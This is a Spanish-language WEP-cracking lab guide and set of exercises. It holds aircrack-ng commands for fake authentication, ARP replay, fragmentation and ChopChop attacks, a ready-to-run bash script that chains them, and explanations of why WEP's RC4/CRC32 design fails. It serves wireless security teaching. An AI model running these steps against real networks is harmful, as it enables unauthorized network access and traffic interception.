# WEP Ejercicios + Lab

## 1) Laboratorio paso a paso (setup y flujo)

1. Preparar la interfaz

```bash
# colocar en monitor mode (ejemplo con airmon-ng)
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
# o con airmon-ng (depende distro)
sudo airmon-ng start wlan0
# confirmar nombre de la interfaz monitor (wlan0mon o wlan0)
iwconfig
```

2. Captura inicial (verificar AP, clientes y IVs)

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
# observar columnas: STATION, #Data, IV
```

3. (Si AP requiere autenticación) Fake authentication

```bash
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon
#  -1 = fake auth, 0 = keepalive
```

4. Generar IVs rápido: ARP replay

```bash
# en nueva terminal, tras fakeauth exitosa:
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon
# monitoriza con airodump-ng y observa IVs subir
```

5. Cuando tengamos suficientes IVs, crackear:

```bash
aircrack-ng wep_capture-01.cap
# o especificar longitud
aircrack-ng -n 64 wep_capture-01.cap
aircrack-ng -n 128 wep_capture-01.cap
# con wordlist
aircrack-ng -w wordlist.txt wep_capture-01.cap
```

6. Técnicas alternativas (si ARP no funciona):

```bash
# Fragmentation
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon

# ChopChop
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon

# Interactive (manipulación/replay)
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
```

7. Limpieza / volver a managed
```bash
# si usaste airmon-ng
sudo airmon-ng stop wlan0mon
sudo ip link set wlan0 up
# o:
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

## 2) Set de ejercicios
#### Ejercicio A — Captura pasiva (baseline)

Objetivo: medir IVs sin inyección.
Comando:

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_passive wlan0mon
# dejar 30 minutos y anotar IVs iniciales/finales
```

Registro sugerido (CSV):
> essid,bssid,canal,bitlen,ivs_ini,ivs_fin,tiempo_min,crack_ok

#### Ejercicio B — Fakeauth + ARP replay (ataque típico)

Objetivo: generar IVs rápido y crackear.
Script (copiar y ejecutar en carpeta de lab):

```bash
#!/bin/bash
BSSID="AA:BB:CC:DD:EE:FF"
MYMAC="CC:DD:EE:FF:AA:BB"
IF="wlan0mon"
OUT="wep_arp"

# captura en background
sudo airodump-ng -c 6 --bssid $BSSID -w $OUT $IF & PID_AIRO=$!
sleep 2

# fakeauth
sudo aireplay-ng -1 0 -a $BSSID -h $MYMAC $IF
sleep 2

# arp replay
sudo aireplay-ng -3 -b $BSSID -h $MYMAC $IF

# al terminar, mata airodump (ctrl+c manual si querés)
# kill $PID_AIRO
```

Ejecución: chmod +x run_arp_lab.sh && sudo ./run_arp_lab.sh
Mide: IVs/minuto, tiempo hasta crack.

#### Ejercicio C — Sin clientes: Fragmentation

Objetivo: obtener plaintext sin clientes conectados.
Comandos:

```bash
# captura primero paquetes
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_frag wlan0mon

# luego
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon
# el ataque -5 intentará recuperar un paquete en claro
```
#### Ejercicio D — ChopChop (byte-by-byte)

Objetivo: recuperar un paquete y generar condiciones para replay.

```bash
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:AA:BB wlan0mon
```
#### Ejercicio E — Comparativa 64 vs 128 bits

Objetivo: repetir Ej B con AP 64-bit y 128-bit WEP, anotar IVs y tiempos.

## 3) Detalle técnico (cómo funcionan y por qué sirven)
#### ¿Qué es un IV y por qué importa?

* WEP usa RC4 con un vector de inicialización (IV) de 24 bits concatenado con la clave compartida. Cada paquete cifrado incluye su IV en claro. Diferentes IVs → diferentes keystreams; muchos IVs permiten que ataques estadísticos (FMS, KoreK, PTW) recuperen la clave WEP analizando correlaciones entre IVs y bytes cifrados.

* IVs únicos y numerosos = más datos para los algoritmos de recuperación.

#### Fake Authentication (aireplay-ng -1)

**Propósito:** algunos APs WEP requieren autenticación antes de aceptar tramas de data o permitir inyección. -1 engaña al AP haciéndose pasar por un cliente válido. Una vez “autenticado”, la tarjeta atacante puede inyectar tramas (ej. ARP replay).

* No altera la captura; solo habilita inyección.

#### ARP Replay (aireplay-ng -3)

**Idea:** observar un ARP request/reply en claro (o un paquete reutilizable) y retransmitirlo muchas veces al AP. Cada retransmisión genera una trama cifrada nueva con un nuevo IV desde el AP -> genera gran cantidad de IVs en poco tiempo.

Es la técnica más eficiente en laboratorios **con clients conectados**. Produce decenas de miles de IVs en minutos.

* Dependencia: necesitas un paquete ARP válido observado (o generar uno desde un cliente).

#### Fragmentation attack (aireplay-ng -5)

Basado en cómo WEP fragmenta paquetes: si consiguimos interceptar un paquete fragmentado y tenemos la habilidad de manipular fragmentos y usar el keystream parcialmente, podemos recuperar el primer fragmento en claro sin conocer la clave completa.

**Proceso (resumido):** se captura un paquete fragmentado, se usan fragmentos conocidos y respuestas del AP para deducir parte de la keystream y así obtener un paquete en claro (por ejemplo ARP). Con ese ARP en claro puedes hacer replay y generar IVs.

**Ventaja:** funciona sin clientes activos si hay paquetes fragmentados o ciertos patrones. Es más complejo y menos usado que ARP-replay en práctica.

#### ChopChop attack (aireplay-ng -4)

Permite descifrar byte a byte un paquete cifrado mediante retención y modificación del último byte del paquete y observando la respuesta del AP (si la modificación es válida o no). Cada acierto te acerca a reconstruir el paquete completo.

**Uso:** recuperar un paquete en claro a partir de un paquete cifrado y así conseguir algo útil (por ejemplo, un ARP) para el replay.

Muy didáctico para entender diseño fallido de WEP: demuestra vulnerabilidad por manipulación de CRC y la forma en que RC4 + CRC32 fueron integrados pobremente.

#### Interactive (aireplay-ng -2)

Modo interactivo para reenviar paquetes (replay) y probar respuestas del AP: cambiar campos, flags, etc. Se usa para tests finos de comportamiento del AP y para provocar respuestas útiles.

#### Algoritmos de recuperación (breve)

FMS/KoreK/PTW: algoritmos estadísticos que analizan patrones en IVs y bytes cifrados para recuperar la clave. aircrack-ng implementa variantes eficientes (PTW es muy común y rápido).

Cuantos más IVs, mayor probabilidad de recuperar la clave con éxito y menor tiempo.


